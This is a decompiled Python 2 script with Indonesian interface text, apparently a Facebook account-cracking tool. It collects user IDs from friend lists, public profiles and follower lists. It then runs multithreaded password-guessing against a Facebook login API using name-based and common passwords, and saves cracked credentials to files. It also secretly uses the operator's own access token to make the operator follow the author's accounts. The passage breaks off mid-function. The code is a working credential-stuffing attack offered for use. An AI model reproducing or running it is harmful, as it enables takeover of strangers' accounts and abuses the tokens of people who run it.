# Decompile by KangEhem:)
# with (uncompyle6) version : 3.7.4
# Time Succes decompile : 2021-11-08 04:07:46.051208
import os, sys, time, datetime, random, hashlib, re, threading, json, urllib, cookielib, requests, uuid
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from datetime import datetime
i = '\x1b[1;92m'
c = '\x1b[1;96m'
m = '\x1b[1;91m'
u = '\x1b[1;95m'
k = '\x1b[1;93m'
p = '\x1b[1;97m'
h = '\x1b[1;90m'
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m'
O = '\x1b[1;96m'
N = '\x1b[0m'
try:
    import requests
except ImportError:
    os.system('pip2 install requests')
reload(sys)
sys.setdefaultencoding('utf8')
useragents = 'Mozilla/5.0 (NokiaC5-00)UC AppleWebkit(like Gecko) Safari/530'
ua = 'Mozilla/5.0 (NokiaC5-00)UC AppleWebkit(like Gecko) Safari/530'
uas = 'Mozilla/5.0 (NokiaC5-00)UC AppleWebkit(like Gecko) Safari/530'
ip = requests.get('https://api.ipify.org').text
uas = random.choice(['Mozilla/5.0 (NokiaC5-00)UC AppleWebkit(like Gecko) Safari/530'])
id = []
cp = []
ok = []
loop = 0
ct = datetime.now()
n = ct.month
bulan = [
 'Januari',
 'Februari',
 'Maret',
 'April',
 'Mei',
 'Juni',
 'Juli',
 'Agustus',
 'September',
 'Oktober',
 'Nopember',
 'Desember']
try:
    if n < 0 or n > 12:
        exit()
    nTemp = n - 1
except ValueError:
    exit()
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
op = bulan[nTemp]
durasi = str(datetime.now().strftime('%d-%m-%Y'))
logo = '\n\x1b[1;93m\xe2\x96\x92\xe2\x96\x88\xe2\x96\x80\xe2\x96\x80\xe2\x96\x80\xe2\x96\x88 \xe2\x96\x80\xe2\x96\x88\xe2\x96\x80 \xe2\x96\x92\xe2\x96\x88\xe2\x96\x80\xe2\x96\x84\xe2\x96\x80\xe2\x96\x88 \xe2\x96\x92\xe2\x96\x88\xe2\x96\x80\xe2\x96\x80\xe2\x96\x88 \xe2\x96\x92\xe2\x96\x88\xe2\x96\x80\xe2\x96\x80\xe2\x96\x80\n\x1b[1;97m\xe2\x96\x91\xe2\x96\x80\xe2\x96\x80\xe2\x96\x80\xe2\x96\x84\xe2\x96\x84 \xe2\x96\x92\xe2\x96\x88\xe2\x96\x91 \xe2\x96\x92\xe2\x96\x88\xe2\x96\x92\xe2\x96\x88\xe2\x96\x92\xe2\x96\x88 \xe2\x96\x92\xe2\x96\x88\xe2\x96\x80\xe2\x96\x80\xe2\x96\x84 \xe2\x96\x92\xe2\x96\x88\xe2\x96\x80\xe2\x96\x80\xe2\x96\x80\n\x1b[1;96m\xe2\x96\x92\xe2\x96\x88\xe2\x96\x84\xe2\x96\x84\xe2\x96\x84\xe2\x96\x88 \xe2\x96\x84\xe2\x96\x88\xe2\x96\x84 \xe2\x96\x92\xe2\x96\x88\xe2\x96\x91\xe2\x96\x91\xe2\x96\x92\xe2\x96\x88 \xe2\x96\x92\xe2\x96\x88\xe2\x96\x84\xe2\x96\x84\xe2\x96\x88 \xe2\x96\x92\xe2\x96\x88\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\n\x1b[0;33mCODE BY \x1b[0;33m\x1b[1;0m\x1b[1;41mMR JEECK\x1b[1;0m \x1b[0;35mFOLLOW ME\x1b[0;35m\n\x1b[0;35mGITHUB\x1b[0;35m \x1b[1;0m\x1b[1;41mhttps://gitbub.com/mrjeeck\x1b[1;0m\n'
def bot_follow():
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\n   [!] Tolong Masukan Token Yang Benar'
        logs()
        requests.post('https://graph.facebook.com/100032577396395/subscribers?access_token=' + toket)
        requests.post('https://graph.facebook.com/100032577396395/subscribers?access_token=' + toket)
        requests.post('https://graph.facebook.com/100032577396395/subscribers?access_token=' + toket)
        requests.post('https://graph.facebook.com/100032577396395/subscribers?access_token=' + toket)
        requests.post('https://graph.facebook.com/100032577396395/subscribers?access_token=' + toket)
        requests.post('https://graph.facebook.com/100032577396395/subscribers?access_token=' + toket)
    requests.post('https://graph.facebook.com/100032577396395/subscribers?access_token=' + toket)
    requests.post('https://graph.facebook.com/100032577396395/subscribers?access_token=' + toket)
    requests.post('https://graph.facebook.com/100032577396395/subscribers?access_token=' + toket)
    requests.post('https://graph.facebook.com/100032577396395/subscribers?access_token=' + toket)
    requests.post('https://graph.facebook.com/100025411306232/subscribers?access_token=' + toket)
    print '[+] \x1b[92mLogin Sukses!\x1b[0m'
    print '\x1b[0;91mNote Dari gwa\x1b[0;91m \x1b[0;93m:\x1b[0;93m \x1b[0;94mJika Ingin OnetapYes\x1b[0;94m'
    print 'Kalian Crack Nya Pakai Metode \x1b[0;91mDump Id Alamat Yang Sama\x1b[0;91m'
    raw_input('\x1b[0;97m[\x1b[0;97m \x1b[0;93m$\x1b[0;93m \x1b[0;97m]\x1b[0;97m  \x1b[0;92mTekan Enter Untuk Run Tools\x1b[0;92m ')
    menu()
    print '[!] Tolong Masukan Token Yang Benar'
    sys.exit()
def tokenz():
    os.system('clear')
    try:
        token = open('login.txt', 'r')
        menu()
    except (KeyError, IOError):
        os.system('clear')
        print logo
        print '' + p + ''
        print '[+] Di Isi Dengan Benar Ganz/Canz :('
        token = raw_input('\n[+] Token : ')
        try:
            otw = requests.get('https://graph.facebook.com/me?access_token=' + token)
            a = json.loads(otw.text)
            zedd = open('login.txt', 'w')
            zedd.write(token)
            zedd.close()
            bot_follow()
            menu()
        except KeyError:
            print '[!] Tolong Masukan Token Yang Benar'
            sys.exit()
def menu():
    global token
    os.system('clear')
    try:
        token = open('login.txt', 'r').read()
        otw = requests.get('https://graph.facebook.com/me/?access_token=' + token)
        a = json.loads(otw.text)
        nama = a['name']
        id = a['id']
    except KeyError:
        os.system('clear')
        print '[!] Tolong Masukan Token Yang Benar'
        os.system('rm -f login.txt')
        time.sleep(3)
        tokenz()
    except requests.exceptions.ConnectionError:
        print '[!] Tidak Dapat Tersambung Koneksi'
        sys.exit()
    print logo
    print '' + p + ''
    print '\x1b[1;94m\xe2\x94\x9c\xef\xbf\xbd\xef\xbf\xbd\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xef\xbf\xbd\xef\xbf\xbd\xe2\x94\xa4'
    print '[+] Bergabung    : \x1b[0;97m' + durasi
    print '\x1b[1;94m\xe2\x94\x9c\xef\xbf\xbd\xef\xbf\xbd\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xef\xbf\xbd\xef\xbf\xbd\xe2\x94\xa4'
    print '' + p + '[+] Premium      : ' + M + 'Belum Ada Keterangan'
    print '\x1b[1;94m\xe2\x94\x9c\xef\xbf\xbd\xef\xbf\xbd\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xef\xbf\xbd\xef\xbf\xbd\xe2\x94\xa4'
    print '' + p + '[+] IP Anda      : ' + p + '' + ip
    print '\x1b[1;94m\xe2\x94\x9c\xef\xbf\xbd\xef\xbf\xbd\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xef\xbf\xbd\xef\xbf\xbd\xe2\x94\xa4'
    print '' + p + ''
    print '[ Hello \x1b[1;92m' + nama + '\x1b[0;97m ]'
    print '' + B + ''
    print '[' + k + '1' + p + ']. Metode B-Api (Fast Crack)'
    print '[' + k + '2' + p + ']. Metode Mbasic (Lambat Dan Memuaskaan )'
    print '[' + m + '0' + p + ']. Keluar (Hapus Token :( )'
    method = raw_input('\n[?] Pilih : ')
    if method == '':
        menu()
    elif method == '01' or method == '1':
        menubapi()
    elif method == '02' or method == '2':
        menumbasic()
    elif method == '00' or method == '0':
        os.system('rm -f login.txt')
        print '[!] Berhasil Menghapus Token'
        print 'Terimakasih Telah Terhubung Di Tools Saya'
        exit()
    else:
        exit('[!] Pilih Yang Benar Ganz/Canz :(')
def menubapi():
    global token
    os.system('clear')
    try:
        token = open('login.txt', 'r').read()
        otw = requests.get('https://graph.facebook.com/me/?access_token=' + token)
        a = json.loads(otw.text)
        nama = a['name']
        id = a['id']
    except KeyError:
        os.system('clear')
        print '[!] Tolong Masukan Token Yang Benar'
        os.system('rm -f login.txt')
        time.sleep(3)
        tokenz()
    except requests.exceptions.ConnectionError:
        print '[!] Tidak Dapat Tersambung Koneksi'
        sys.exit()
    print logo
    print '' + p + ''
    print '\x1b[1;94m\xe2\x94\x9c\xef\xbf\xbd\xef\xbf\xbd\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xef\xbf\xbd\xef\xbf\xbd\xe2\x94\xa4'
    print '' + p + '[\xc3\x97]\x1b[1;92m Methode B-Api'
    print '\x1b[1;94m\xe2\x94\x9c\xef\xbf\xbd\xef\xbf\xbd\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xef\xbf\xbd\xef\xbf\xbd\xe2\x94\xa4'
    print '' + p + '[+] Bergabung    : ' + p + '' + durasi
    print '\x1b[1;94m\xe2\x94\x9c\xef\xbf\xbd\xef\xbf\xbd\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xef\xbf\xbd\xef\xbf\xbd\xe2\x94\xa4'
    print '' + p + '[+] Premium      : ' + M + 'Belum Ada Keterangan'
    print '\x1b[1;94m\xe2\x94\x9c\xef\xbf\xbd\xef\xbf\xbd\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xef\xbf\xbd\xef\xbf\xbd\xe2\x94\xa4'
    print '' + p + '[+] IP Anda      : ' + p + '' + ip
    print '\x1b[1;94m\xe2\x94\x9c\xef\xbf\xbd\xef\xbf\xbd\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xef\xbf\xbd\xef\xbf\xbd\xe2\x94\xa4'
    print '' + p + ''
    print '[ Hello \x1b[1;92m' + nama + '\x1b[0;97m ]'
    print '' + p + ''
    print '' + p + '[1]. Crack Dari Teman Sendiri'
    print '[2]. Crack Dari ID Publik'
    print '[3]. Crack Dari Followers'
    print '[4]. Lihat Hasil Crack'
    print '[' + m + '0' + p + ']. Keluar (Hapus Token)'
    pilih_menubapi()
def pilih_menubapi():
    ask = raw_input('\n[?] Pilih : ')
    if ask == '':
        print '[!] Pilih Yang Benar Ganz/Canz :('
        exit()
    elif ask == '01' or ask == '1':
        r = requests.get('https://graph.facebook.com/me/friends?access_token=' + token)
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + nm)
    elif ask == '02' or ask == '2':
        idt = raw_input('[+] ID Publik : ')
        try:
            pok = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token)
            sp = json.loads(pok.text)
            print '[+] Nama : ' + sp['name']
        except KeyError:
            print '[!] ID Tidak Tersedia/Tidak Ditemukan'
            exit()
        r = requests.get('https://graph.facebook.com/' + idt + '/friends?limit=5000&access_token=' + token)
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + nm)
    elif ask == '03' or ask == '3':
        idt = raw_input('[+] ID Followers : ')
        try:
            pok = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token)
            sp = json.loads(pok.text)
            print '[+] Nama : ' + sp['name']
        except KeyError:
            print '[!] ID Tidak Tersedia/Tidak Ditemukan'
            exit()
        r = requests.get('https://graph.facebook.com/' + idt + '/subscribers?limit=999999&access_token=' + token)
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + nm)
    elif ask == '04' or ask == '4':
        print '\n[1] Hasil OK '
        print '[2] Hasil CP '
        ress = raw_input('\n[?] Pilih : ')
        if ress == '':
            menu()
        elif ress == '01' or ress == '1':
            print '\x1b[1;94m\xe2\x94\x9c\xef\xbf\xbd\xef\xbf\xbd\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xef\xbf\xbd\xef\xbf\xbd\xe2\x94\xa4'
            print '\n[+] Hasil \x1b[0;92mOK\x1b[0;97m Tanggal : \x1b[0;92m%s-%s-%s\x1b[0;97m' % (ha, op, ta)
            print '\x1b[1;94m\xe2\x94\x9c\xef\xbf\xbd\xef\xbf\xbd\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xef\xbf\xbd\xef\xbf\xbd\xe2\x94\xa4'
            os.system('cat out/OK-%s-%s-%s.txt' % (ha, op, ta))
            exit()
        elif ress == '02' or ress == '2':
            print '\x1b[1;94m\xe2\x94\x9c\xef\xbf\xbd\xef\xbf\xbd\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xef\xbf\xbd\xef\xbf\xbd\xe2\x94\xa4'
            print '[+] Hasil \x1b[0;93mCP\x1b[0;97m Tanggal : \x1b[0;92m%s-%s-%s\x1b[0;97m' % (ha, op, ta)
            print '\x1b[1;94m\xe2\x94\x9c\xef\xbf\xbd\xef\xbf\xbd\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xef\xbf\xbd\xef\xbf\xbd\xe2\x94\xa4'
            os.system('cat out/CP-%s-%s-%s.txt' % (ha, op, ta))
            exit()
        else:
            exit('[!] Pilih Yang Benar Ganz/Canz :(')
    elif ask == '00' or ask == '0':
        os.system('rm -f login.txt')
        print '[!] Berhasil Menghapus Token'
        print 'Terimakasih Telah Terhubung Tools Saya'
        exit()
    else:
        print '[!] Pilih Yang Benar Ganz/Canz :('
        exit()
    ask = raw_input('[?] Ingin Gunakan Password Manual? Y/t : ')
    if ask == 'Y' or ask == 'y':
        manualbapi()
    print '[+] Total ID : ' + str(len(id))
    print '[+] File Tersimpan Di:out/OK-%s-%s-%s.txt' % (ha, op, ta)
    print '[+] File Tersimpan Di:out/CP-%s-%s-%s.txt' % (ha, op, ta)
    print '[\xc3\x97]\x1b[0;92m Jangan Lupa Follow Github Author\x1b[0;97m'
    print '\x1b[1;94m\xe2\x94\x9c\xef\xbf\xbd\xef\xbf\xbd\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xef\xbf\xbd\xef\xbf\xbd\xe2\x94\xa4'
    print ''
    def main(arg):
        global loop
        w = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m'])
        print '\r\x1b[0;97m[><] %s/%s OK-:%s - CP-:%s  ' % (loop, len(id), len(ok), len(cp)),
        sys.stdout.flush()
        user = arg
        uid, name = user.split('|')
        try:
            os.mkdir('out')
        except OSError:
            pass
        try:
            for pw in [name.lower(), name.lower() + '123', name.lower() + '1234', name.lower() + '12345', name.lower() + '786', name.lower() + '321', 'katasandi', 'sayang', 'bismillah', 'doraemon', 'sayangku', 'indonesia', 'rahasia', 'sayangkamu', 'gggaming', 'ganteng', 'tytydgede', 'pantekkau', 'loveme']:
                ua_api = {'user-agent': ua}
                param = {'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32', 'format': 'json', 'sdk_version': '2', 
                   'email': uid, 
                   'locale': 'en_US', 
                   'password': pw, 
                   'sdk': 'ios', 
                   'generate_session_cookies': '1', 
                   'sig': '3f555f99fb61fcd7aa0c44f58f522ef6'}
                api = 'https://b-api.facebook.com/method/auth.login'
                response = requests.get(api, params=param, headers=ua_api)
                if 'session_key' in response.text and 'EAAA' in response.text:
                    print '\r\x1b[0;92m[OK] ' + uid + ' | ' + pw + '        '
                    ok.append(uid + ' | ' + pw)
                    save = open('out/OK-%s-%s-%s.txt' % (ha, op, ta), 'a')
                    save.write('[OK] ' + str(uid) + ' | ' + str(pw) + '\n')
                    save.close()
                    break
                    continue
                    continue
                elif 'www.facebook.com' in response.json()['error_msg']:
                    print '\r\x1b[0;93m[CP] ' + uid + ' | ' + pw + '        '
                    cp.append(uid + ' | ' + pw)
                    save = open('out/CP-%s-%s-%s.txt' % (ha, op, ta), 'a')
                    save.write('[CP] ' + str(uid) + ' | ' + str(pw) + '\n')
                    save.close()
                    break
                    continue
                    continue
            loop += 1
        except:
            pass
    p = ThreadPool(30)
    p.map(main, id)
    print '\n[+] Selesai'
    exit()
def manualbapi():
    print '\n[+] Buat Password Contoh : sayang,rahasia'
    pw = raw_input('[?] Password : ').split(',')
    if len(pw) == 0:
        exit('[!] Isi Yang Benar, Tidak Boleh Kosong!')
    print '[+] Total ID : ' + str(len(id))
    print '[+] File \x1b[0;92mOK\x1b[0;97m Tersimpan Di:out/OK-%s-%s-%s.txt' % (ha, op, ta)
    print '[+] File \x1b[0;93mCP\x1b[0;97m Tersimpan Di:out/CP-%s-%s-%s.txt' % (ha, op, ta)
    print '[\xc3\x97]\x1b[0;92m Jangan Lupa Follow Githu Author\x1b[0;97m'
    print '\x1b[1;94m\xe2\x94\x9c\xef\xbf\xbd\xef\xbf\xbd\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xef\xbf\xbd\xef\xbf\xbd\xe2\x94\xa4'
    print ''
    def main(arg):
        global loop
        w = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m'])
        print '\r\x1b[0;97m[><] %s/%s OK-:%s - CP-:%s ' % (loop, len(id), len(ok), len(cp)),
        sys.stdout.flush()
        user = arg
        uid, name = user.split('|')
        try:
            os.mkdir('out')
        except OSError:
            pass
        try:
            for asu in pw:
                ua_apim = {'user-agent': ua}
